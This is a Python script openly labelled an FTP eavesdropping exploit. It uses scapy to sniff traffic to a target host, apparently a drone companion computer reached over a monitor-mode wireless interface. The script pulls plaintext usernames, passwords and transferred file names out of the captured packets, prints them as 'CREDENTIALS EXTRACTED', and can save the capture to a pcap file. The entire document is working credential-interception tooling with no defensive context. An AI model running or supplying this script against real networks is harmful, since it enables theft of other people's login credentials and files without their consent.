#!/usr/bin/env python3
"""
FTP Eavesdropping Exploit Script
Intercepts FTP traffic to companion computer to extract files and credentials
"""

import sys
import time
from collections import defaultdict

def check_scapy():
    """Check if scapy is available"""
    try:
        from scapy.all import sniff, IP, TCP, Raw
        return True
    except ImportError:
        return False

def capture_ftp_traffic(interface, target_host=None, duration=60, output_file=None):
    """
    Capture FTP traffic
    
    Args:
        interface: Network interface to capture on
        target_host: Target FTP server IP (optional filter)
        duration: Capture duration in seconds
        output_file: File to save captured data
    """
    scapy_available = check_scapy()
    
    if not scapy_available:
        print("[-] scapy not available")
        print("[!] Install with: pip install scapy")
        return
    
    from scapy.all import sniff, IP, TCP, Raw, wrpcap
    
    # FTP uses port 21 for control, dynamic ports for data
    if target_host:
        filter_expr = f"host {target_host} and (port 21 or portrange 1024-65535)"
    else:
        filter_expr = "port 21 or portrange 1024-65535"
    
    print(f"[*] Starting FTP traffic capture on {interface}...")
    print(f"[*] Duration: {duration} seconds")
    if target_host:
        print(f"[*] Target: {target_host}")
    print()
    
    captured_packets = []
    ftp_commands = []
    ftp_responses = []
    credentials = {}
    files_transferred = []
    
    def process_packet(packet):
        """Process captured FTP packet"""
        if IP in packet and TCP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            
            # FTP control is on port 21
            if dport == 21 or sport == 21:
                if Raw in packet:
                    try:
                        data = packet[Raw].load.decode('utf-8', errors='ignore').strip()
                        
                        if data:
                            # FTP commands (client to server)
                            if sport != 21:
                                ftp_commands.append({
                                    'time': time.time(),
                                    'src': src_ip,
                                    'command': data
                                })
                                print(f"[+] FTP Command: {data}")
                                
                                # Extract credentials
                                if data.startswith('USER '):
                                    username = data[5:].strip()
                                    credentials['username'] = username
                                    print(f"[!] Username: {username}")
                                elif data.startswith('PASS '):
                                    password = data[5:].strip()
                                    credentials['password'] = password
                                    print(f"[!] Password: {password}")
                                
                                # Extract file operations
                                if data.startswith('RETR ') or data.startswith('STOR '):
                                    filename = data[5:].strip()
                                    files_transferred.append({
                                        'operation': 'RETR' if data.startswith('RETR') else 'STOR',
                                        'filename': filename,
                                        'time': time.time()
                                    })
                                    print(f"[!] File operation: {data}")
                            
                            # FTP responses (server to client)
                            else:
                                ftp_responses.append({
                                    'time': time.time(),
                                    'dst': dst_ip,
                                    'response': data
                                })
                                print(f"[+] FTP Response: {data}")
                    except:
                        pass
            
            captured_packets.append(packet)
            if len(captured_packets) % 50 == 0:
                print(f"[*] Captured {len(captured_packets)} packets...")
    
    # Start capture
    try:
        packets = sniff(iface=interface, filter=filter_expr, timeout=duration, prn=process_packet)
        print(f"\n[+] Capture complete: {len(packets)} packets captured")
    except Exception as e:
        print(f"[-] Error during capture: {e}")
        return
    
    # Save to file if specified
    if output_file:
        try:
            wrpcap(output_file, captured_packets)
            print(f"[+] Packets saved to {output_file}")
        except Exception as e:
            print(f"[-] Error saving packets: {e}")
    
    # Summary
    print("\n" + "="*50)
    print("FTP EAVESDROPPING SUMMARY")
    print("="*50)
    print(f"Total packets: {len(captured_packets)}")
    print(f"FTP commands: {len(ftp_commands)}")
    print(f"FTP responses: {len(ftp_responses)}")
    
    if credentials:
        print("\n[!] CREDENTIALS EXTRACTED:")
        for key, value in credentials.items():
            print(f"    {key}: {value}")
    
    if files_transferred:
        print(f"\n[!] FILES TRANSFERRED: {len(files_transferred)}")
        for file_info in files_transferred:
            print(f"    [{file_info['operation']}] {file_info['filename']}")

def intercept_ftp_session(interface, target_host):
    """
    Intercept active FTP session
    
    Args:
        interface: Network interface
        target_host: Target FTP server
    """
    print(f"[*] Intercepting FTP session to {target_host}...")
    print("[*] This will capture all FTP traffic in real-time")
    
    capture_ftp_traffic(interface, target_host, duration=300)  # 5 minutes

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ftp_eavesdropping.py <interface> [target_host] [options...]")
        print("\nArguments:")
        print("  interface     Network interface (e.g., wlan0mon or eth0)")
        print("  target_host   Target FTP server IP (optional)")
        print("\nOptions:")
        print("  --duration <sec>    Capture duration (default: 60)")
        print("  --output <file>      Output pcap file")
        print("\nExamples:")
        print("  python3 ftp_eavesdropping.py wlan0mon")
        print("  python3 ftp_eavesdropping.py wlan0mon 192.168.13.1")
        print("  python3 ftp_eavesdropping.py wlan0mon 192.168.13.1 --duration 300 --output ftp_capture.pcap")
        sys.exit(1)
    
    interface = sys.argv[1]
    target_host = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith('--') else None
    
    # Parse options
    duration = 60
    output_file = None
    
    i = 2 if target_host else 2
    if target_host:
        i = 3
    
    while i < len(sys.argv):
        if sys.argv[i] == '--duration' and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == '--output' and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            i += 2
        else:
            i += 1
    
    # Perform capture
    if target_host:
        intercept_ftp_session(interface, target_host)
    else:
        capture_ftp_traffic(interface, duration=duration, output_file=output_file)

if __name__ == "__main__":
    main()
